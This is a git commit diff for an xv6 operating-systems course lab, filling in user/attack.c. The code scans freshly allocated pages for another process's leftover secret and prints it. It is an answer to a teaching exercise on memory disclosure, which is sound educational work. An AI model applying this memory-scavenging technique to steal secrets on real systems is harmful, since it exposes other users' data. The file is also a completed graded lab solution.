c233b2a2e897c0fec92f5a87f32019b84e85f93f
Kettenkrad <kettenkrad@Kettenkrad-2.local>
2025-08-25 17:02:47 +0800

    lab2: attack and time

--- xv6-labs-2024/lab2-syscall/user/attack.c
+++ xv6-labs-2024/lab2-syscall/user/attack.c
@@ -8,6 +8,15 @@ main(int argc, char *argv[])
 {
   // your code here.  you should write the secret to fd 2 using write
   // (e.g., write(2, secret, 8)
-
+  char *secret = sbrk(PGSIZE*32);
+  for (int i = 0; i < 32; ++i) {
+    secret += PGSIZE;
+    if (*(secret + 8) == 'v') {
+      write(2, secret + 32, 8);
+      break;
+    }
+    
+  }
+  
   exit(1);
 }
